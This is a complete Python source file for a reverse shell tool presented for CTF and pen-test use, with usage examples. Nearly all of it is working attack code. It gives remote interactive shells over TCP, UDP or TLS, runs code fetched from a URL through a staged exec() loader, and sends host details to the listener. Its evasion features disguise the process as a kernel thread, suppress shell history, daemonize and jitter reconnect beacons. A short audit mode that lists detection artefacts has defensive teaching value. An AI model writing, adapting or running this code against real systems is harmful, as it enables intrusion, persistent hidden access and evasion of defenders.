#!/usr/bin/env python3
"""
Reverse Shell Utility — CTF / Authorized Pen-Test Edition, (ok), tbh..
Copyright (C) 2026

IMPORTANT LEGAL NOTICE:
This tool is provided for AUTHORIZED SECURITY TESTING ONLY.
Users must have explicit written permission before using this tool.
Unauthorized use may violate computer fraud and abuse laws.
Users take full responsibility for any actions performed using this tool.
This program is distributed under the GPL v2 license.

Features
────────
  Transport   : plain TCP · UDP · TLS/SSL
  Protocol    : IPv4 · IPv6
  Shell modes : PTY (fully interactive) · subprocess pipe · select() mux
  Evasion     : process rename · HISTFILE suppression · double-fork daemon
  Resilience  : reconnect loop · configurable jitter
  Staging     : HTTP payload fetch + eval (CTF loader pattern)
  Blue team   : --audit mode prints fd/proc artefacts without connecting

Examples
────────
  # Plain PTY shell
  python3 revsh.py -H 10.0.0.1 -p 4444

  # TLS encrypted, IPv6, reconnect every 15 s
  python3 revsh.py -H fe80::1 -p 4444 --ssl --ipv6 --reconnect --interval 15

  # UDP shell
  python3 revsh.py -H 10.0.0.1 -p 4444 --udp

  # Daemonize (double-fork, survives parent death)
  python3 revsh.py -H 10.0.0.1 -p 4444 --daemonize

  # Rename process (hide in ps output)
  python3 revsh.py -H 10.0.0.1 -p 4444 --proc-name "[kworker/0:0]"

  # select() multiplexed (no dup2 of fd 0/1/2)
  python3 revsh.py -H 10.0.0.1 -p 4444 --mux

  # Staged: fetch real payload from HTTP server
  python3 revsh.py --stage http://10.0.0.1/payload.py

  # Blue team audit (no network — just show artefacts)
  python3 revsh.py -H 10.0.0.1 -p 4444 --audit
"""

from __future__ import annotations

import argparse
import ctypes
import ctypes.util
import os
import platform
import pty
import select
import socket
import ssl
import subprocess
import sys
import time
import urllib.request
import random
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional


# ──────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────

SHELLS: tuple[str, ...] = (
    "/bin/bash",
    "/bin/sh",
    "/bin/dash",
    "/bin/zsh",
    "/bin/ksh",
    "/usr/bin/bash",
    "/usr/bin/zsh",
    "/usr/local/bin/bash",
)

_LINUX = platform.system() == "Linux"


# ──────────────────────────────────────────────
# Process rename  (mirrors Perl's $0 = "...")
# ──────────────────────────────────────────────

def _rename_process(name: str) -> None:
    """
    Rename the process as it appears in ps / /proc/self/cmdline.

    On Linux we write directly into the C argv[0] buffer via ctypes so
    that /proc/self/cmdline is also updated (sys.argv[0] alone only
    affects Python-level introspection).
    """
    # Python-level rename — affects repr() and some tools
    sys.argv[0] = name

    if not _LINUX:
        return

    try:
        # Overwrite the argv[0] buffer in the C runtime.
        # PR_SET_NAME (15) sets the thread name (≤15 chars, visible in `ps`).
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        PR_SET_NAME = 15
        libc.prctl(PR_SET_NAME, name.encode()[:15], 0, 0, 0)
    except Exception:
        pass  # non-fatal — best effort


# ──────────────────────────────────────────────
# Double-fork daemon  (mirrors Perl's POSIX::setsid pattern)
# ──────────────────────────────────────────────

def _daemonize() -> None:
    """
    Classic Unix double-fork daemonization.

    Fork 1 → parent exits      (detach from terminal)
    setsid  → new session
    Fork 2 → parent exits      (prevent re-acquiring a controlling terminal)
    Child continues as daemon with no TTY.
    """
    if os.fork() > 0:
        os._exit(0)          # first parent exits
    os.setsid()
    if os.fork() > 0:
        os._exit(0)          # second parent exits
    # Redirect daemon's own stdin/stdout/stderr to /dev/null
    devnull = os.open("/dev/null", os.O_RDWR)
    for fd in (0, 1, 2):
        os.dup2(devnull, fd)


# ──────────────────────────────────────────────
# Shell discovery  (mirrors Perl's shell-path brute-force)
# ──────────────────────────────────────────────

def _resolve_shell(requested: str) -> str:
    """
    Return `requested` if it exists and is executable, otherwise walk
    SHELLS until one is found.  Raises SystemExit if nothing works.
    """
    if Path(requested).is_file() and os.access(requested, os.X_OK):
        return requested
    for candidate in SHELLS:
        if Path(candidate).is_file() and os.access(candidate, os.X_OK):
            print(
                f"[~] Requested shell {requested!r} not found; "
                f"using {candidate!r}",
                file=sys.stderr,
            )
            return candidate
    raise SystemExit("[-] No usable shell found on this system.")


# ──────────────────────────────────────────────
# TLS context
# ──────────────────────────────────────────────

def _make_ssl_context(
    certfile: Optional[str],
    keyfile: Optional[str],
    verify: bool,
) -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    if verify and certfile:
        ctx.load_verify_locations(certfile)
    else:
        # CTF / testing: skip cert verification (mirrors IO::Socket::SSL verify=0)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    if certfile and keyfile:
        ctx.load_cert_chain(certfile, keyfile)
    return ctx


# ──────────────────────────────────────────────
# Configuration dataclass
# ──────────────────────────────────────────────

@dataclass
class ShellConfig:
    host: str
    port: int
    shell: str               = "/bin/bash"
    timeout: int             = 30
    udp: bool                = False
    ipv6: bool               = False
    use_ssl: bool            = False
    ssl_cert: Optional[str]  = None
    ssl_key: Optional[str]   = None
    ssl_verify: bool         = False
    reconnect: bool          = False
    interval: int            = 10
    jitter: int              = 3
    daemonize: bool          = False
    proc_name: Optional[str] = None
    mux: bool                = False
    audit: bool              = False
    send_sysinfo: bool       = True
    extra_env: dict          = field(default_factory=dict)


# ──────────────────────────────────────────────
# Blue team audit
# ──────────────────────────────────────────────

def _audit(cfg: ShellConfig) -> None:
    """
    Print the artefacts a defender would observe — fd mappings, cmdline,
    syscall sequence — without making any network connection.

    Useful for CTF blue-team challenge design and teaching detection.
    """
    print("\n[AUDIT MODE — no network connection made]\n")

    print("── Process artefacts ──────────────────────────────")
    print(f"  /proc/self/cmdline : {' '.join(sys.argv)}")
    print(f"  sys.argv[0]        : {sys.argv[0]}")

    if _LINUX:
        try:
            comm = Path("/proc/self/comm").read_text().strip()
            print(f"  /proc/self/comm    : {comm}")
        except OSError:
            pass
        print("\n  /proc/self/fd/ before dup2:")
        try:
            fds = sorted(
                int(e.name)
                for e in Path("/proc/self/fd").iterdir()
                if e.name.isdigit()
            )
            for fd in fds:
                try:
                    target = os.readlink(f"/proc/self/fd/{fd}")
                    print(f"    fd {fd:2d} → {target}")
                except OSError:
                    pass
        except PermissionError:
            print("    (permission denied)")

    print("\n── Syscall sequence (what strace/auditd would see) ─")
    af = "AF_INET6" if cfg.ipv6 else "AF_INET"
    proto = "SOCK_DGRAM" if cfg.udp else "SOCK_STREAM"
    print(f"  socket({af}, {proto}, 0)")
    print(f"  connect(fd, {{{cfg.host}:{cfg.port}}}, ...)")
    if not cfg.mux:
        for fd_n, name in ((0, "STDIN"), (1, "STDOUT"), (2, "STDERR")):
            print(f"  dup2(sockfd, {fd_n})   # {name}")
    print(f"  execve(\"{cfg.shell}\", [\"{cfg.shell}\", \"-i\"], ...)")

    print("\n── Network indicators ─────────────────────────────")
    print(f"  Outbound {'UDP' if cfg.udp else 'TCP'} "
          f"{'(TLS)' if cfg.use_ssl else ''} → {cfg.host}:{cfg.port}")
    print("  Process: python3 making outbound connection")
    print("  Anomaly: dup2 of fd 0/1/2 to socket fd\n")


# ──────────────────────────────────────────────
# Staged loader  (mirrors Perl's LWP::Simple eval pattern)
# ──────────────────────────────────────────────

def _run_staged(url: str) -> None:
    """
    Fetch a Python payload from `url` and exec() it in the current
    process context.

    CTF use: host a second-stage .py on your HTTP server.
    The first-stage (this call) is kept tiny so it fits in constrained
    command fields.
    """
    print(f"[~] Fetching stage from {url}", file=sys.stderr)
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:  # noqa: S310
            code = resp.read().decode()
    except Exception as exc:
        raise SystemExit(f"[-] Stage fetch failed: {exc}") from exc
    print("[~] Executing stage...", file=sys.stderr)
    exec(compile(code, "<stage>", "exec"), {"__name__": "__main__"})  # noqa: S102


# ──────────────────────────────────────────────
# Core reverse shell class
# ──────────────────────────────────────────────

class ReverseShell:
    """
    Reverse shell with pluggable transport, shell mode, and evasion.

    Shell modes
    ───────────
    PTY (default)
        os.dup2 → pty.spawn()
        Fully interactive: tab completion, vim, sudo, passwd all work.
        Mirrors Perl's IO::Pty approach.

    Mux  (--mux)
        select()-based bidirectional relay.
        Does NOT touch fd 0/1/2 — harder to detect via /proc/self/fd.
        Mirrors Perl's select() mux in Section 8.

    Transport modes
    ───────────────
    Plain TCP (default), UDP (--udp), TLS (--ssl)
    IPv4 (default) or IPv6 (--ipv6)
    """

    def __init__(self, cfg: ShellConfig) -> None:
        self.cfg = cfg
        self.sock: Optional[socket.socket] = None
        self._resolved_shell = _resolve_shell(cfg.shell)

    # ── Transport ──────────────────────────────────────────────────────

    def _make_socket(self) -> socket.socket:
        af = socket.AF_INET6 if self.cfg.ipv6 else socket.AF_INET
        kind = socket.SOCK_DGRAM if self.cfg.udp else socket.SOCK_STREAM
        return socket.socket(af, kind)

    def connect(self) -> bool:
        """Open (and optionally TLS-wrap) the transport socket."""
        try:
            raw = self._make_socket()
            raw.settimeout(self.cfg.timeout)
            raw.connect((self.cfg.host, self.cfg.port))

            if self.cfg.use_ssl and not self.cfg.udp:
                ctx = _make_ssl_context(
                    self.cfg.ssl_cert,
                    self.cfg.ssl_key,
                    self.cfg.ssl_verify,
                )
                self.sock = ctx.wrap_socket(
                    raw, server_hostname=self.cfg.host
                )
            else:
                self.sock = raw

            print(
                f"[+] Connected to {self.cfg.host}:{self.cfg.port}"
                f"{' (TLS)' if self.cfg.use_ssl else ''}",
                file=sys.stderr,
            )
            return True

        except (socket.error, ssl.SSLError) as exc:
            print(f"[-] Connection failed: {exc}", file=sys.stderr)
            return False

    def cleanup(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    # ── Sysinfo banner  (like Perl's initial uname/id/pwd send) ────────

    def _send_sysinfo(self) -> None:
        if not self.cfg.send_sysinfo or not self.sock:
            return
        try:
            info = subprocess.check_output(
                "uname -a; id; pwd",
                shell=True,
                stderr=subprocess.STDOUT,
            )
            self.sock.sendall(info + b"\n")
        except Exception:
            pass

    # ── Environment hardening ──────────────────────────────────────────

    def _harden_env(self) -> None:
        """
        Suppress shell history and apply any caller-supplied env vars.
        Mirrors Perl's $ENV{HISTFILE} = "/dev/null".
        """
        os.environ["HISTFILE"] = "/dev/null"
        os.environ["HISTSIZE"] = "0"
        os.environ.update(self.cfg.extra_env)

    # ── Shell modes ────────────────────────────────────────────────────

    def _spawn_pty(self) -> None:
        """
        Fully interactive PTY shell.

        dup2(sockfd → 0/1/2) then pty.spawn() gives a real PTY so
        readline, tab-completion, curses apps (vim, top) all work.
        """
        assert self.sock is not None
        fd = self.sock.fileno()
        os.dup2(fd, 0)
        os.dup2(fd, 1)
        os.dup2(fd, 2)
        self._harden_env()
        pty.spawn([self._resolved_shell, "-i"])

    def _spawn_mux(self) -> None:
        """
        select()-multiplexed shell — does NOT dup2 fd 0/1/2.

        Spawns the shell as a subprocess with its own pipes, then
        relays data between the socket and the subprocess using
        select().  The main process fd table stays clean.

        Mirrors Section 8 of the Perl reference docs.
        """
        assert self.sock is not None
        self._harden_env()

        proc = subprocess.Popen(
            [self._resolved_shell, "-i"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )

        self.sock.setblocking(False)
        assert proc.stdout is not None
        assert proc.stdin is not None

        try:
            while proc.poll() is None:
                rlist = [self.sock, proc.stdout]
                readable, _, _ = select.select(rlist, [], [], 1.0)
                for src in readable:
                    if src is self.sock:
                        try:
                            data = self.sock.recv(4096)
                        except (BlockingIOError, ssl.SSLWantReadError):
                            continue
                        if not data:
                            return
                        proc.stdin.write(data)
                        proc.stdin.flush()
                    else:
                        data = src.read(4096)
                        if not data:
                            return
                        self.sock.sendall(data)
        finally:
            proc.terminate()

    def spawn_shell(self) -> None:
        """Dispatch to the correct shell mode."""
        if not self.sock:
            raise RuntimeError("Not connected")
        self._send_sysinfo()
        if self.cfg.mux:
            self._spawn_mux()
        else:
            self._spawn_pty()

    # ── Reconnect loop  (mirrors Perl's IO::Socket reconnect loop) ─────

    def run(self) -> None:
        """
        Connect once, or loop forever with jitter if --reconnect.

        Jitter = random ± cfg.jitter seconds added to the base interval
        so that reconnect attempts don't produce a perfectly regular
        network signature.
        """
        while True:
            if self.connect():
                try:
                    self.spawn_shell()
                except Exception as exc:
                    print(f"[-] Shell error: {exc}", file=sys.stderr)
                finally:
                    self.cleanup()

            if not self.cfg.reconnect:
                break

            jitter = random.uniform(-self.cfg.jitter, self.cfg.jitter)
            wait = max(1, self.cfg.interval + jitter)
            print(
                f"[~] Reconnecting in {wait:.1f}s …",
                file=sys.stderr,
            )
            time.sleep(wait)


# ──────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Reverse shell — authorized CTF / pen-test use only.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="WARNING: Only use with explicit written authorization.",
    )

    # ── Target ────────────────────────────────────────────────────────
    tgt = p.add_argument_group("target")
    tgt.add_argument("-H", "--host", help="Listener IP address")
    tgt.add_argument("-p", "--port", type=int, help="Listener port")

    # ── Shell ─────────────────────────────────────────────────────────
    sh = p.add_argument_group("shell")
    sh.add_argument(
        "-s", "--shell", default="/bin/bash",
        help="Shell binary (default: /bin/bash; falls back automatically)",
    )
    sh.add_argument(
        "--mux", action="store_true",
        help="select() mux mode — avoids dup2 of fd 0/1/2",
    )
    sh.add_argument(
        "--no-sysinfo", action="store_true",
        help="Skip initial uname/id/pwd banner",
    )

    # ── Transport ─────────────────────────────────────────────────────
    tr = p.add_argument_group("transport")
    tr.add_argument("--udp", action="store_true", help="UDP transport")
    tr.add_argument("--ipv6", action="store_true", help="IPv6")
    tr.add_argument(
        "-t", "--timeout", type=int, default=30,
        help="Connection timeout in seconds (default: 30)",
    )

    # ── TLS ───────────────────────────────────────────────────────────
    tls = p.add_argument_group("tls")
    tls.add_argument("--ssl", action="store_true", dest="use_ssl",
                     help="Wrap connection in TLS")
    tls.add_argument("--ssl-cert", help="CA cert (or client cert) PEM file")
    tls.add_argument("--ssl-key", help="Client key PEM file")
    tls.add_argument(
        "--ssl-verify", action="store_true",
        help="Verify server certificate (default: no, for CTF use)",
    )

    # ── Resilience ────────────────────────────────────────────────────
    res = p.add_argument_group("resilience")
    res.add_argument(
        "--reconnect", action="store_true",
        help="Loop and reconnect on disconnect",
    )
    res.add_argument(
        "--interval", type=int, default=10,
        help="Seconds between reconnect attempts (default: 10)",
    )
    res.add_argument(
        "--jitter", type=int, default=3,
        help="±N seconds random jitter on reconnect (default: 3)",
    )

    # ── Evasion ───────────────────────────────────────────────────────
    ev = p.add_argument_group("evasion")
    ev.add_argument(
        "--daemonize", action="store_true",
        help="Double-fork to background (survives parent death)",
    )
    ev.add_argument(
        "--proc-name",
        help='Rename process in ps, e.g. "[kworker/0:0]"',
    )

    # ── Staging ───────────────────────────────────────────────────────
    st = p.add_argument_group("staging")
    st.add_argument(
        "--stage",
        metavar="URL",
        help="Fetch and exec a Python payload from URL (staged loader)",
    )

    # ── Blue team ─────────────────────────────────────────────────────
    bt = p.add_argument_group("blue team / audit")
    bt.add_argument(
        "--audit", action="store_true",
        help="Print detection artefacts without connecting",
    )

    return p


def _validate(args: argparse.Namespace) -> None:
    if args.stage:
        return   # staged mode — host/port not required
    if not args.audit:
        if not args.host:
            raise SystemExit("[-] --host is required")
        if not args.port:
            raise SystemExit("[-] --port is required")
        if not (1 <= args.port <= 65535):
            raise SystemExit("[-] Port must be 1–65535")


def main(argv: Optional[list[str]] = None) -> int:
    args = build_parser().parse_args(argv)
    _validate(args)

    # ── Staged loader shortcut ────────────────────────────────────────
    if args.stage:
        _run_staged(args.stage)
        return 0

    cfg = ShellConfig(
        host=args.host or "",
        port=args.port or 0,
        shell=args.shell,
        timeout=args.timeout,
        udp=args.udp,
        ipv6=args.ipv6,
        use_ssl=args.use_ssl,
        ssl_cert=args.ssl_cert,
        ssl_key=args.ssl_key,
        ssl_verify=args.ssl_verify,
        reconnect=args.reconnect,
        interval=args.interval,
        jitter=args.jitter,
        daemonize=args.daemonize,
        proc_name=args.proc_name,
        mux=args.mux,
        audit=args.audit,
        send_sysinfo=not args.no_sysinfo,
    )

    # ── Audit mode ────────────────────────────────────────────────────
    if cfg.audit:
        _audit(cfg)
        return 0

    # ── Pre-flight evasion ────────────────────────────────────────────
    if cfg.proc_name:
        _rename_process(cfg.proc_name)

    if cfg.daemonize:
        _daemonize()

    # ── Run ───────────────────────────────────────────────────────────
    shell = ReverseShell(cfg)
    try:
        shell.run()
    except KeyboardInterrupt:
        print("\n[!] Interrupted", file=sys.stderr)
    except Exception as exc:
        print(f"[-] Fatal: {exc}", file=sys.stderr)
        return 1
    finally:
        shell.cleanup()

    return 0


if __name__ == "__main__":
    sys.exit(main())
